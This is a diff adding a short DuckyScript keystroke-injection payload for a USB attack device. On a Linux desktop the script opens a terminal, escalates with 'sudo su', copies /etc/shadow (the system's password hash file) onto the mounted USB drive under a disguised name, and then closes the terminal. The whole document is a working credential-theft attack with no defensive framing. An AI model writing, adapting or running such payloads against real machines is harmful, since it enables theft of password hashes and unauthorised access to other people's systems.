@@ -1,0 +1,16 @@
+DELAY 3000
+REM Open Terminal
+CONTROL ALT T
+DELAY 500
+REM Gain root access
+STRING sudo su
+ENTER
+DELAY 500
+REM Provide a delay for the user to enter their password if needed
+DELAY 5000
+REM Copy /etc/shadow to the mounted USB drive
+STRING cp /etc/shadow /media/$(whoami)/*/shadow_backup.txt
+ENTER
+REM Close the terminal
+STRING exit
+ENTER
